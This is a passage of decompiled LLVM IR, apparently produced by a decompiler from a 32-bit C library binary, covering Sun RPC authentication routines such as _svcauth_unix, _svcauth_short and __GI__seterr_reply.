  %v2_33aa0 = load i8, i8* %v1_33aa0, align 1
  %v3_33aa0 = zext i8 %v2_33aa0 to i32
  %v5_33aa0 = add i32 %v0_33aa0, 1
  %v1_33aa4 = inttoptr i32 %v0_33aa4 to i8*
  %v2_33aa4 = load i8, i8* %v1_33aa4, align 1
  %v3_33aa4 = zext i8 %v2_33aa4 to i32
  %v3_33aa8 = icmp ult i32 %v2_33a9c, %v5_33aa0
  %v3_33aac = sub nsw i32 %v3_33aa0, %v3_33aa4
  br i1 %v3_33aa8, label %dec_label_pc_33ab4, label %bb6

bb6:                                              ; preds = %dec_label_pc_33aa0
  %v5_33aa4 = add i32 %v0_33aa4, 1
  %v10_33aac = icmp eq i8 %v2_33aa0, %v2_33aa4
  br i1 %v10_33aac, label %dec_label_pc_33aa0, label %dec_label_pc_33ab4

dec_label_pc_33ab4:                               ; preds = %dec_label_pc_33aa0, %bb6
  ret i32 %v3_33aac

; uselistorder directives
  uselistorder i32 %v5_33aa0, { 1, 0 }
  uselistorder i32 %v0_33aa0, { 1, 0 }
  uselistorder i32 %v0_33aa4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_33ab4, { 1, 0 }
}

define i32 @_svcauth_short() local_unnamed_addr {
entry:
  ret i32 2
}

define i32 @_svcauth_unix(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_33ac8 = load i32, i32* @r4, align 4
  store i32 %v3_33ac8, i32* %stack_var_-32, align 4
  %v6_33ac8 = load i32, i32* @r5, align 4
  %v9_33ac8 = load i32, i32* @r6, align 4
  %v12_33ac8 = load i32, i32* @r7, align 4
  %v15_33ac8 = load i32, i32* @r8, align 4
  %v24_33ac8 = load i32, i32* @lr, align 4
  %v1_33acc = add i32 %arg1, 24
  %v2_33acc = inttoptr i32 %v1_33acc to i32*
  %v3_33acc = load i32, i32* %v2_33acc, align 4
  store i32 %v3_33acc, i32* @r6, align 4
  %v1_33ad0 = add i32 %v3_33acc, 24
  %v1_33ad4 = add i32 %v3_33acc, 280
  store i32 %v1_33ad4, i32* %r2.global-to-local, align 4
  %v2_33ad8 = add i32 %v3_33acc, 4
  %v3_33ad8 = inttoptr i32 %v2_33ad8 to i32*
  store i32 %v1_33ad0, i32* %v3_33ad8, align 4
  %v0_33adc = load i32, i32* %r2.global-to-local, align 4
  %v1_33adc = load i32, i32* @r6, align 4
  %v2_33adc = add i32 %v1_33adc, 20
  %v3_33adc = inttoptr i32 %v2_33adc to i32*
  store i32 %v0_33adc, i32* %v3_33adc, align 4
  %v1_33ae0 = add i32 %arg2, 32
  %v2_33ae0 = inttoptr i32 %v1_33ae0 to i32*
  %v3_33ae0 = load i32, i32* %v2_33ae0, align 4
  store i32 %v3_33ae0, i32* @sl, align 4
  %v2_33ae4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v3_33ae0, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v2_33ae4, i32* %r0.global-to-local, align 4
  %v1_33afc = add i32 %arg2, 28
  %v2_33afc = inttoptr i32 %v1_33afc to i32*
  %v3_33afc = load i32, i32* %v2_33afc, align 4
  %v4_33b00 = load i32, i32* %stack_var_-32, align 4
  %v10_33b00 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-56, i32 %v3_33afc, i32 %v3_33ae0, i32 1, i32 %v4_33b00, i32 %v6_33ac8, i32 %v9_33ac8, i32 %v12_33ac8, i32 %v15_33ac8)
  store i32 %v2_33ae4, i32* %r0.global-to-local, align 4
  %v3_33b0c = load i32, i32* %stack_var_-52, align 4
  %v1_33b10 = add i32 %v3_33b0c, 24
  %v2_33b10 = inttoptr i32 %v1_33b10 to i32*
  %v3_33b10 = load i32, i32* %v2_33b10, align 4
  store i32 %v3_33b10, i32* @ip, align 4
  store i32 211740, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_33b10)
  %v0_33b20 = load i32, i32* %r0.global-to-local, align 4
  %v2_33b20 = icmp eq i32 %v0_33b20, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @sb, align 4
  br i1 %v2_33b20, label %dec_label_pc_33c74, label %dec_label_pc_33b2c

dec_label_pc_33b2c:                               ; preds = %entry
  %v2_33b30 = load i32, i32* %stack_var_-56, align 4
  %v5_33b30 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v5_33b30, i32* %r4.global-to-local, align 4
  %v5_33b48 = call i32 @llvm.bswap.i32(i32 %v2_33b30)
  %v1_33b4c = load i32, i32* @r6, align 4
  %v2_33b4c = inttoptr i32 %v1_33b4c to i32*
  store i32 %v5_33b48, i32* %v2_33b4c, align 4
  %v3_33b50 = load i32, i32* %stack_var_-52, align 4
  %v3_33b58 = udiv i32 %v3_33b50, 16777216
  %v1_33b54 = udiv i32 %v3_33b50, 256
  %v4_33b5c = and i32 %v1_33b54, 65280
  %v5_33b5c = or i32 %v4_33b5c, %v3_33b58
  %v1_33b60 = and i32 %v3_33b50, 65280
  store i32 %v1_33b60, i32* %r2.global-to-local, align 4
  %v4_33b64 = mul nuw nsw i32 %v1_33b60, 256
  %v5_33b64 = or i32 %v5_33b5c, %v4_33b64
  store i32 %v5_33b64, i32* @r3, align 4
  %v5_33b68 = call i32 @llvm.bswap.i32(i32 %v3_33b50)
  store i32 %v5_33b68, i32* @r5, align 4
  %v2_33b6c = icmp ugt i32 %v5_33b68, 254
  %v2_33b70 = icmp ne i32 %v3_33b50, -16777216
  %v3_33b70 = and i1 %v2_33b6c, %v2_33b70
  br i1 %v3_33b70, label %dec_label_pc_33cdc, label %dec_label_pc_33b74

dec_label_pc_33b74:                               ; preds = %dec_label_pc_33b2c
  %v2_33b74 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_33b74, i32* @r4, align 4
  store i32 %v2_33b74, i32* @r1, align 4
  store i32 %v5_33b68, i32* @r2, align 4
  %v0_33b80 = load i32, i32* @r6, align 4
  %v1_33b80 = add i32 %v0_33b80, 4
  %v2_33b80 = inttoptr i32 %v1_33b80 to i32*
  %v3_33b80 = load i32, i32* %v2_33b80, align 4
  store i32 %v3_33b80, i32* @r0, align 4
  %v0_33b84 = call i32 @memcpy()
  store i32 %v0_33b84, i32* %r0.global-to-local, align 4
  %v0_33b88 = load i32, i32* @r6, align 4
  %v1_33b88 = add i32 %v0_33b88, 4
  %v2_33b88 = inttoptr i32 %v1_33b88 to i32*
  %v3_33b88 = load i32, i32* %v2_33b88, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_33b90 = load i32, i32* @r5, align 4
  %v4_33b90 = add i32 %v3_33b90, %v3_33b88
  %v5_33b90 = inttoptr i32 %v4_33b90 to i8*
  store i8 0, i8* %v5_33b90, align 1
  %v0_33b94 = load i32, i32* @r5, align 4
  %v1_33b94 = add i32 %v0_33b94, 3
  %v1_33b98 = and i32 %v1_33b94, -4
  store i32 %v1_33b98, i32* %lr.global-to-local, align 4
  %v0_33b9c = load i32, i32* @r4, align 4
  %v2_33b9c = add i32 %v0_33b9c, %v1_33b98
  %v3_33b9c = inttoptr i32 %v2_33b9c to i32*
  %v4_33b9c = load i32, i32* %v3_33b9c, align 4
  %v1_33bac = and i32 %v4_33b9c, 65280
  store i32 %v1_33bac, i32* %r2.global-to-local, align 4
  %v5_33bb4 = call i32 @llvm.bswap.i32(i32 %v4_33b9c)
  %v1_33bb8 = load i32, i32* @r6, align 4
  %v2_33bb8 = add i32 %v1_33bb8, 8
  %v3_33bb8 = inttoptr i32 %v2_33bb8 to i32*
  store i32 %v5_33bb4, i32* %v3_33bb8, align 4
  %v0_33bbc = load i32, i32* @r4, align 4
  %v1_33bbc = load i32, i32* %lr.global-to-local, align 4
  %v2_33bbc = add i32 %v1_33bbc, %v0_33bbc
  store i32 %v2_33bbc, i32* %r4.global-to-local, align 4
  %v1_33bc0 = add i32 %v2_33bbc, 4
  %v2_33bc0 = inttoptr i32 %v1_33bc0 to i32*
  %v3_33bc0 = load i32, i32* %v2_33bc0, align 4
  %v1_33bd0 = and i32 %v3_33bc0, 65280
  store i32 %v1_33bd0, i32* %r2.global-to-local, align 4
  %v5_33bd8 = call i32 @llvm.bswap.i32(i32 %v3_33bc0)
  %v1_33bdc = load i32, i32* @r6, align 4
  %v2_33bdc = add i32 %v1_33bdc, 12
  %v3_33bdc = inttoptr i32 %v2_33bdc to i32*
  store i32 %v5_33bd8, i32* %v3_33bdc, align 4
  %v0_33be0 = load i32, i32* %r4.global-to-local, align 4
  %v1_33be0 = add i32 %v0_33be0, 4
  store i32 %v1_33be0, i32* %r4.global-to-local, align 4
  %v1_33be4 = add i32 %v0_33be0, 8
  %v2_33be4 = inttoptr i32 %v1_33be4 to i32*
  %v3_33be4 = load i32, i32* %v2_33be4, align 4
  %v1_33bf4 = and i32 %v3_33be4, 65280
  store i32 %v1_33bf4, i32* %r2.global-to-local, align 4
  %v5_33bfc = call i32 @llvm.bswap.i32(i32 %v3_33be4)
  store i32 %v5_33bfc, i32* %ip.global-to-local, align 4
  %v7_33c00 = icmp eq i32 %v3_33be4, 268435456
  %v2_33c08 = icmp ult i32 %v5_33bfc, 16
  %v3_33c08 = or i1 %v7_33c00, %v2_33c08
  br i1 %v3_33c08, label %dec_label_pc_33c40.preheader, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_33b74
  store i32 %v1_33be4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_33cdc

dec_label_pc_33c40.preheader:                     ; preds = %dec_label_pc_33b74
  %v5_33c08 = add i32 %v0_33be0, 12
  store i32 %v5_33c08, i32* %r4.global-to-local, align 4
  %v5_33c0c = load i32, i32* @r6, align 4
  %v6_33c0c = add i32 %v5_33c0c, 16
  %v7_33c0c = inttoptr i32 %v6_33c0c to i32*
  store i32 %v5_33bfc, i32* %v7_33c0c, align 4
  %v0_33c4013 = load i32, i32* %r0.global-to-local, align 4
  %v1_33c4014 = load i32, i32* %ip.global-to-local, align 4
  %v3_33c4016 = icmp ult i32 %v0_33c4013, %v1_33c4014
  br i1 %v3_33c4016, label %dec_label_pc_33c18, label %dec_label_pc_33c48

dec_label_pc_33c18:                               ; preds = %dec_label_pc_33c40.preheader, %dec_label_pc_33c18
  %v2_33c38 = phi i32 [ %v1_33c3c, %dec_label_pc_33c18 ], [ %v0_33c4013, %dec_label_pc_33c40.preheader ]
  %v0_33c18 = load i32, i32* %r4.global-to-local, align 4
  %v1_33c18 = inttoptr i32 %v0_33c18 to i32*
  %v2_33c18 = load i32, i32* %v1_33c18, align 4
  %v4_33c18 = add i32 %v0_33c18, 4
  store i32 %v4_33c18, i32* %r4.global-to-local, align 4
  %v1_33c28 = and i32 %v2_33c18, 65280
  store i32 %v1_33c28, i32* %r2.global-to-local, align 4
  %v0_33c30 = load i32, i32* @r6, align 4
  %v1_33c30 = add i32 %v0_33c30, 20
  %v2_33c30 = inttoptr i32 %v1_33c30 to i32*
  %v3_33c30 = load i32, i32* %v2_33c30, align 4
  store i32 %v3_33c30, i32* %r2.global-to-local, align 4
  %v5_33c34 = call i32 @llvm.bswap.i32(i32 %v2_33c18)
  %v5_33c38 = mul i32 %v2_33c38, 4
  %v6_33c38 = add i32 %v3_33c30, %v5_33c38
  %v7_33c38 = inttoptr i32 %v6_33c38 to i32*
  store i32 %v5_33c34, i32* %v7_33c38, align 4
  %v0_33c3c = load i32, i32* %r0.global-to-local, align 4
  %v1_33c3c = add i32 %v0_33c3c, 1
  store i32 %v1_33c3c, i32* %r0.global-to-local, align 4
  %v1_33c40 = load i32, i32* %ip.global-to-local, align 4
  %v3_33c40 = icmp ult i32 %v1_33c3c, %v1_33c40
  br i1 %v3_33c40, label %dec_label_pc_33c18, label %dec_label_pc_33c40.dec_label_pc_33c48_crit_edge

dec_label_pc_33c40.dec_label_pc_33c48_crit_edge:  ; preds = %dec_label_pc_33c18
  br label %dec_label_pc_33c48

dec_label_pc_33c48:                               ; preds = %dec_label_pc_33c40.preheader, %dec_label_pc_33c40.dec_label_pc_33c48_crit_edge
  %v0_33c5c = phi i32 [ %v1_33c40, %dec_label_pc_33c40.dec_label_pc_33c48_crit_edge ], [ %v1_33c4014, %dec_label_pc_33c40.preheader ]
  %v0_33c48 = load i32, i32* %lr.global-to-local, align 4
  %v1_33c48 = add i32 %v0_33c48, 20
  %v4_33c4c = mul i32 %v0_33c5c, 4
  %v5_33c4c = add i32 %v1_33c48, %v4_33c4c
  %v1_33c50 = load i32, i32* @sl, align 4
  %tmp = icmp ugt i32 %v5_33c4c, %v1_33c50
  br i1 %tmp, label %dec_label_pc_33c58, label %dec_label_pc_33ca0

dec_label_pc_33c58:                               ; preds = %dec_label_pc_33c48
  %v0_33c60 = load i32, i32* @sb, align 4
  %v2_33c60 = add i32 %v0_33c60, -33052
  %v3_33c60 = inttoptr i32 %v2_33c60 to i8*
  store i32 %v2_33c60, i32* %r0.global-to-local, align 4
  store i32 %v0_33c48, i32* %r2.global-to-local, align 4
  %v3_33c6c = call i32 (i8*, ...) @printf(i8* %v3_33c60)
  store i32 %v3_33c6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_33cdc

dec_label_pc_33c74:                               ; preds = %entry
  store i32 %v2_33ae4, i32* %r0.global-to-local, align 4
  %v0_33c78 = load i32, i32* @r6, align 4
  %v3_33c7c = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-56, i32 %v0_33c78)
  store i32 %v3_33c7c, i32* %r0.global-to-local, align 4
  %v2_33c80 = icmp eq i32 %v3_33c7c, 0
  br i1 %v2_33c80, label %dec_label_pc_33c88, label %dec_label_pc_33ca0

dec_label_pc_33c88:                               ; preds = %dec_label_pc_33c74
  store i32 %v2_33ae4, i32* %r0.global-to-local, align 4
  %v0_33c90 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_33c98 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-56, i32 %v0_33c90)
  store i32 %v3_33c98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_33cdc

dec_label_pc_33ca0:                               ; preds = %dec_label_pc_33c48, %dec_label_pc_33c74
  %v0_33ca0 = load i32, i32* @r7, align 4
  %v1_33ca0 = add i32 %v0_33ca0, 44
  %v2_33ca0 = inttoptr i32 %v1_33ca0 to i32*
  %v3_33ca0 = load i32, i32* %v2_33ca0, align 4
  store i32 %v3_33ca0, i32* %ip.global-to-local, align 4
  %v2_33ca4 = icmp eq i32 %v3_33ca0, 0
  %v0_33ca8 = load i32, i32* @r8, align 4
  %v1_33ca8 = add i32 %v0_33ca8, 28
  %v2_33ca8 = inttoptr i32 %v1_33ca8 to i32*
  %v3_33ca8 = load i32, i32* %v2_33ca8, align 4
  store i32 %v3_33ca8, i32* %r2.global-to-local, align 4
  br i1 %v2_33ca4, label %.thread11, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_33ca0
  %v2_33cac = add i32 %v0_33ca0, 36
  %v3_33cac = inttoptr i32 %v2_33cac to i32*
  %v4_33cac = load i32, i32* %v3_33cac, align 4
  %v3_33cb0 = add i32 %v3_33ca8, 32
  %v4_33cb0 = inttoptr i32 %v3_33cb0 to i32*
  store i32 %v4_33cac, i32* %v4_33cb0, align 4
  %v1_33cb4 = load i32, i32* @r7, align 4
  %v2_33cb4 = add i32 %v1_33cb4, 40
  %v3_33cb4 = inttoptr i32 %v2_33cb4 to i32*
  %v4_33cb4 = load i32, i32* %v3_33cb4, align 4
  store i32 %v4_33cb4, i32* %r2.global-to-local, align 4
  %v1_33cb8 = load i32, i32* @r8, align 4
  %v2_33cb8 = add i32 %v1_33cb8, 28
  %v3_33cb8 = inttoptr i32 %v2_33cb8 to i32*
  %v4_33cb8 = load i32, i32* %v3_33cb8, align 4
  %v3_33cc0 = add i32 %v4_33cb8, 36
  %v4_33cc0 = inttoptr i32 %v3_33cc0 to i32*
  store i32 %v4_33cb4, i32* %v4_33cc0, align 4
  %v1_33cc8.pre = load i32, i32* @r8, align 4
  %phitmp = add i32 %v1_33cc8.pre, 28
  %phitmp34 = inttoptr i32 %phitmp to i32*
  %v4_33cc8 = load i32, i32* %phitmp34, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_33cd4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb

.thread11:                                        ; preds = %dec_label_pc_33ca0
  %.pre = add i32 %v3_33ca8, 32
  %.pre33 = inttoptr i32 %.pre to i32*
  store i32 0, i32* %.pre33, align 4
  %v1_33cc4 = load i32, i32* @r8, align 4
  %v2_33cc4 = add i32 %v1_33cc4, 28
  %v3_33cc4 = inttoptr i32 %v2_33cc4 to i32*
  %v4_33cc4 = load i32, i32* %v3_33cc4, align 4
  %v1_33cd0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_33cd0, i32* %r4.global-to-local, align 4
  br label %bb

bb:                                               ; preds = %._crit_edge, %.thread11
  %v1_33cd440 = phi i32 [ %v4_33cc8, %._crit_edge ], [ %v4_33cc4, %.thread11 ]
  %v0_33cd4 = phi i32 [ %v0_33cd4.pre, %._crit_edge ], [ %v1_33cd0, %.thread11 ]
  %v2_33cd4 = add i32 %v1_33cd440, 40
  %v3_33cd4 = inttoptr i32 %v2_33cd4 to i32*
  store i32 %v0_33cd4, i32* %v3_33cd4, align 4
  br label %dec_label_pc_33ce0

dec_label_pc_33cdc:                               ; preds = %.thread38, %dec_label_pc_33b2c, %dec_label_pc_33c88, %dec_label_pc_33c58
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_33ce0

dec_label_pc_33ce0:                               ; preds = %bb, %dec_label_pc_33cdc
  %v3_33ce0 = load i32, i32* %stack_var_-52, align 4
  %v1_33ce4 = add i32 %v3_33ce0, 28
  %v2_33ce4 = inttoptr i32 %v1_33ce4 to i32*
  %v3_33ce4 = load i32, i32* %v2_33ce4, align 4
  %v2_33ce8 = icmp eq i32 %v3_33ce4, 0
  br i1 %v2_33ce8, label %.thread12, label %bb53

bb53:                                             ; preds = %dec_label_pc_33ce0
  store i32 %v2_33ae4, i32* %r0.global-to-local, align 4
  store i32 212216, i32* %lr.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_33ce0, %bb53
  %v2_33cf4 = xor i1 %v2_33ce8, true
  call void @__pseudo_cond_branch(i1 %v2_33cf4, i32 %v3_33ce4)
  %v0_33cf8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_33cf8, i32* %r0.global-to-local, align 4
  %v2_33d00 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_33d00, i32* %r4.global-to-local, align 4
  store i32 %v24_33ac8, i32* %lr.global-to-local, align 4
  ret i32 %v0_33cf8

; uselistorder directives
  uselistorder i32 %v2_33c60, { 1, 0 }
  uselistorder i32 %v1_33c3c, { 1, 2, 0 }
  uselistorder i32 %v5_33bfc, { 2, 0, 1 }
  uselistorder i32 %v5_33b68, { 2, 1, 0 }
  uselistorder i32 %v3_33b50, { 0, 3, 4, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 0, 3, 2, 4, 1, 5 }
  uselistorder i32* %stack_var_-52, { 0, 1, 3, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4, 5, 10, 11, 12, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 6, 5, 12, 7, 8, 10, 9, 11, 13, 15, 16, 14, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 40, { 14, 15, 21, 22, 27, 10, 28, 16, 29, 23, 25, 17, 1, 24, 8, 2, 9, 3, 26, 18, 11, 12, 0, 30, 31, 32, 33, 34, 13, 19, 4, 20, 5, 6, 7 }
  uselistorder i32 36, { 70, 71, 77, 78, 17, 67, 85, 18, 79, 19, 72, 20, 73, 21, 22, 23, 81, 82, 83, 84, 24, 10, 9, 25, 26, 27, 28, 29, 30, 31, 7, 80, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 45, 0, 1, 46, 2, 47, 48, 68, 6, 4, 3, 11, 49, 50, 51, 52, 53, 54, 55, 56, 86, 87, 57, 58, 59, 60, 43, 61, 62, 63, 64, 74, 69, 75, 12, 13, 15, 16, 65, 76, 5, 8, 14, 66 }
  uselistorder i32 44, { 22, 26, 27, 14, 15, 16, 17, 18, 19, 20, 21, 32, 33, 2, 28, 23, 34, 0, 3, 48, 53, 49, 50, 51, 52, 45, 46, 47, 29, 30, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 31, 24, 25, 54, 55, 4, 6, 5, 7, 8, 9, 10, 1, 11, 12, 13 }
  uselistorder i32 65280, { 12, 13, 14, 15, 16, 0, 18, 10, 1, 11, 2, 9, 17, 3, 8, 4, 5, 6, 7 }
  uselistorder i32 (i32*, i32, i32, i32, i32, i32, i32, i32, i32)* @__GI_xdrmem_create, { 1, 3, 0, 2 }
  uselistorder i32 280, { 1, 0, 2 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_33ce0, { 1, 0 }
  uselistorder label %dec_label_pc_33cdc, { 2, 3, 0, 1 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_33ca0, { 1, 0 }
  uselistorder label %dec_label_pc_33c48, { 1, 0 }
  uselistorder label %dec_label_pc_33c18, { 1, 0 }
}

define i32 @__GI__seterr_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v1_33d10 = add i32 %arg1, 8
  %v2_33d10 = inttoptr i32 %v1_33d10 to i32*
  %v3_33d10 = load i32, i32* %v2_33d10, align 4
  store i32 %v3_33d10, i32* %r3.global-to-local, align 4
  %v2_33d14 = icmp eq i32 %v3_33d10, 0
  br i1 %v2_33d14, label %dec_label_pc_33d28, label %dec_label_pc_33d1c

dec_label_pc_33d1c:                               ; preds = %entry
  %v7_33d1c = icmp eq i32 %v3_33d10, 1
  br i1 %v7_33d1c, label %dec_label_pc_33d9c, label %dec_label_pc_33de0

dec_label_pc_33d28:                               ; preds = %entry
  %v1_33d28 = add i32 %arg1, 24
  %v2_33d28 = inttoptr i32 %v1_33d28 to i32*
  %v3_33d28 = load i32, i32* %v2_33d28, align 4
  store i32 %v3_33d28, i32* %r2.global-to-local, align 4
  %v2_33d2c = icmp eq i32 %v3_33d28, 0
  br i1 %v2_33d2c, label %bb, label %bb11

bb:                                               ; preds = %dec_label_pc_33d28
  store i32 0, i32* %arg2, align 4
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_33d28, %bb
  %v0_33d34 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_33d2c, i32 %v0_33d34)
  %v0_33d38 = load i32, i32* %r2.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_33d38, 6
  br i1 %tmp16, label %bb12, label %dec_label_pc_33dd4

bb12:                                             ; preds = %bb11
  %v7_33d3c = mul i32 %v0_33d38, 4
  %v8_33d3c = add i32 %v7_33d3c, ptrtoint (i32* @global_var_33d44.2215 to i32)
  call void @__pseudo_branch(i32 %v8_33d3c)
  br label %dec_label_pc_33dd4

dec_label_pc_33d9c:                               ; preds = %dec_label_pc_33d1c
  %v1_33d9c = add i32 %arg1, 12
  %v2_33d9c = inttoptr i32 %v1_33d9c to i32*
  %v3_33d9c = load i32, i32* %v2_33d9c, align 4
  store i32 %v3_33d9c, i32* %r2.global-to-local, align 4
  %v2_33da0 = icmp eq i32 %v3_33d9c, 0
  br i1 %v2_33da0, label %dec_label_pc_33dc4, label %dec_label_pc_33dac

dec_label_pc_33dac:                               ; preds = %dec_label_pc_33d9c
  %v7_33dac = icmp eq i32 %v3_33d9c, 1
  br i1 %v7_33dac, label %dec_label_pc_33dc4, label %dec_label_pc_33dd4

dec_label_pc_33dc4:                               ; preds = %dec_label_pc_33dac, %dec_label_pc_33d9c
  %storemerge10 = phi i32 [ 6, %dec_label_pc_33d9c ], [ 7, %dec_label_pc_33dac ]
  store i32 %storemerge10, i32* %r3.global-to-local, align 4
  store i32 %storemerge10, i32* %arg2, align 4
  br label %dec_label_pc_33df0

dec_label_pc_33dd4:                               ; preds = %dec_label_pc_33dac, %bb11, %bb12
  %storemerge = phi i32 [ 0, %bb12 ], [ 0, %bb11 ], [ 1, %dec_label_pc_33dac ]
  store i32 16, i32* %arg2, align 4
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_33dd4 = add i32 %tmp, 4
  %v3_33dd4 = inttoptr i32 %v2_33dd4 to i32*
  store i32 %storemerge, i32* %v3_33dd4, align 4
  %v0_33dd8 = load i32, i32* %r2.global-to-local, align 4
  %v2_33dd8 = add i32 %tmp, 8
  %v3_33dd8 = inttoptr i32 %v2_33dd8 to i32*
  store i32 %v0_33dd8, i32* %v3_33dd8, align 4
  br label %dec_label_pc_33df0thread-pre-split

dec_label_pc_33de0:                               ; preds = %dec_label_pc_33d1c
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 16, i32* %arg2, align 4
  %v3_33de8 = load i32, i32* %v2_33d10, align 4
  store i32 %v3_33de8, i32* %r3.global-to-local, align 4
  %v2_33dec = add i32 %tmp, 4
  %v3_33dec = inttoptr i32 %v2_33dec to i32*
  store i32 %v3_33de8, i32* %v3_33dec, align 4
  br label %dec_label_pc_33df0thread-pre-split

dec_label_pc_33df0thread-pre-split:               ; preds = %dec_label_pc_33de0, %dec_label_pc_33dd4
  %v2_33df0.pr = load i32, i32* %arg2, align 4
  br label %dec_label_pc_33df0

dec_label_pc_33df0:                               ; preds = %dec_label_pc_33df0thread-pre-split, %dec_label_pc_33dc4
  %v2_33df0 = phi i32 [ %v2_33df0.pr, %dec_label_pc_33df0thread-pre-split ], [ %storemerge10, %dec_label_pc_33dc4 ]
  store i32 %v2_33df0, i32* %r3.global-to-local, align 4
  %v7_33df4 = icmp eq i32 %v2_33df0, 7
  br i1 %v7_33df4, label %bb14, label %.thread4

bb14:                                             ; preds = %dec_label_pc_33df0
  %v2_33df8 = add i32 %arg1, 16
  %v3_33df8 = inttoptr i32 %v2_33df8 to i32*
  %v4_33df8 = load i32, i32* %v3_33df8, align 4
  store i32 %v4_33df8, i32* %r3.global-to-local, align 4
  %v3_33dfc = add i32 %tmp, 4
  %v4_33dfc = inttoptr i32 %v3_33dfc to i32*
  store i32 %v4_33df8, i32* %v4_33dfc, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_33df0, %bb14
  %v0_33e00 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_33df4, i32 %v0_33e00)
  %v0_33e04 = load i32, i32* %r3.global-to-local, align 4
  %v7_33e04 = icmp eq i32 %v0_33e04, 9
  br i1 %v7_33e04, label %dec_label_pc_33e24, label %dec_label_pc_33e0c

dec_label_pc_33e0c:                               ; preds = %.thread4
  %v7_33e0c = icmp eq i32 %v0_33e04, 6
  br i1 %v7_33e0c, label %bb15, label %.thread6

bb15:                                             ; preds = %dec_label_pc_33e0c
  %v2_33e10 = add i32 %arg1, 16
  %v3_33e10 = inttoptr i32 %v2_33e10 to i32*
  %v4_33e10 = load i32, i32* %v3_33e10, align 4
  store i32 %v4_33e10, i32* %r3.global-to-local, align 4
  %v3_33e14 = add i32 %tmp, 4
  %v4_33e14 = inttoptr i32 %v3_33e14 to i32*
  store i32 %v4_33e10, i32* %v4_33e14, align 4
  %v2_33e18 = add i32 %arg1, 20
  %v3_33e18 = inttoptr i32 %v2_33e18 to i32*
  %v4_33e18 = load i32, i32* %v3_33e18, align 4
  store i32 %v4_33e18, i32* %r3.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_33e0c, %bb15
  %v0_33e1c = load i32, i32* @lr, align 4
  %v2_33e1c = xor i1 %v7_33e0c, true
  call void @__pseudo_cond_branch(i1 %v2_33e1c, i32 %v0_33e1c)
  %v0_33e30.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_33e30

dec_label_pc_33e24:                               ; preds = %.thread4
  %v1_33e24 = add i32 %arg1, 28
  %v2_33e24 = inttoptr i32 %v1_33e24 to i32*
  %v3_33e24 = load i32, i32* %v2_33e24, align 4
  store i32 %v3_33e24, i32* %r3.global-to-local, align 4
  %v2_33e28 = add i32 %tmp, 4
  %v3_33e28 = inttoptr i32 %v2_33e28 to i32*
  store i32 %v3_33e24, i32* %v3_33e28, align 4
  %v1_33e2c = add i32 %arg1, 32
  %v2_33e2c = inttoptr i32 %v1_33e2c to i32*
  %v3_33e2c = load i32, i32* %v2_33e2c, align 4
  store i32 %v3_33e2c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_33e30

dec_label_pc_33e30:                               ; preds = %.thread6, %dec_label_pc_33e24
  %v0_33e30 = phi i32 [ %v0_33e30.pre, %.thread6 ], [ %v3_33e2c, %dec_label_pc_33e24 ]
  %v2_33e30 = add i32 %tmp, 8
  %v3_33e30 = inttoptr i32 %v2_33e30 to i32*
  store i32 %v0_33e30, i32* %v3_33e30, align 4
  ret i32 %arg1

; uselistorder directives
